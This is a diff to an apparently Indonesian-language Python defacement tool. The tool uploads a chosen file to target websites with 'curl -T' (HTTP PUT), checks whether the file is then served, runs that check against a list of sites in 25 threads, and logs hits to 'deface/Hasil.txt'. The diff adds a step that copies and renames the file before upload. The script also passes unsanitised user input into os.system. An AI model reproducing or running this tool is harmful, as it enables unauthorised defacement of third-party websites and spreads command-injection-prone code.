@@ -34,8 +34,10 @@ print(banner)
 def target():
     aa =input("Masukan Link Target : ")
     bb =input("Masukan Alamat File : ")
-    os.system("curl -T %s %s"%(bb,aa))
-    a = aa+'/'+bb
+    cc =input("Tulis ulang nama File saja: ")
+    os.system("cp %s %s"%(bb,cc))
+    os.system("curl -T %s %s"%(cc,aa))
+    a = aa+'/'+cc
     b = requests.get(a)
     if 'error' in str(b.content) or 'not found' in str(b.content):
         print('Gagal ! (Website Not Vuln)')
@@ -84,6 +86,8 @@ except:
     print("Check Your file list")
     pass
 b = input("Masukan alamat File : ")
+cc =input("Tulis ulang nama File saja: ")
+os.system("cp %s %s"%(b,cc))
 z = []
 for c in a:
     z.append(c)
@@ -105,4 +109,4 @@ for d in uhuy:
     x.append(d)
 f=ThreadPool(25)
 f.map(cek, x)
-print ("\n%sFile Tersimpan di folder deface/Hasil.txt"%(c))
+print ("\n"+"%sFile Tersimpan di folder deface/Hasil.txt"%(c))
